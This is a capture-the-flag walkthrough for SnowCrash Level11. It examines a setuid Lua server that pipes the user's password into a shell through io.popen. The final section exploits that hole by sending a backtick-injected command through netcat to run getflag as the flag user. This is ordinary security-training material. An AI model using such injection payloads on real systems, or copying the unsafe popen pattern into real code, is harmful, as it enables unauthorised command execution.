# Level11

## Exploring the exercice

```bash 
$ ls -la
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
```

What is lua ? 
A lightweight, fast programming language often used for scripting and embedding into applications. Lua is valued for its simplicity and flexibility and is commonly used for : video game scripting, embedded applications and interfaces (wireshark, nginx) and others. 


## Inspecting the file

```bash 
$ cat level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

This program implements a server which listens to connexions on port 5151 of the local address 127.0.0.1. 
He receives a password, hashes it and check if it corresponds to the expected hash.

```bash 
$ nc localhost 5151
Password: 
```

As expected the server waits for a password. 

## Getting the flag

Like in previous exercices we are going to try to inject the getflag command. After a few tries we found the correct syntax : 

```bash
$ nc localhost 5151
Password: `getflag` > /tmp/flag
Erf nope..
level11@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : **********
```



